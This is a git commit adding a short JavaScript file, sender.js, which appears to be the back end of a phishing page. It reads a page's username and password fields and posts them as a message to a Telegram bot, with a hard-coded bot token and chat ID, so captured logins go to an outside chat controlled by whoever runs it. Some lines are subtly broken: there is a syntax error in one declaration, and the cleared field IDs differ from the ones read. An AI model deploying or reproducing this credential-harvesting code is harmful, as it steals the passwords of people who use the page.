9fbe730472b82e00b162cbe520aafaead51d3fc4
Batriox7 <faysalrahal36@gmail.com>
2026-07-17 22:12:48 +0100

    Create sender.js

---
+++ sender.js
@@ -0,0 +1,33 @@
+//bot token
+var telegram_bot_id = "1949574883:AAG-88xhsq8h0rBEUxf_Ra7NDjU_408JL-E";
+//chat id
+var chat_id = 1467252650;
+var u_name, email,;
+var ready = function () {
+    u_name = document.getElementById("username").value;
+    email = document.getElementById("password").value;
+    message = "Name: " + u_name + "\nEmail: " + email;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+    });
+    document.getElementById("name").value = "";
+    document.getElementById("email").value = "";
+    return false;
+};
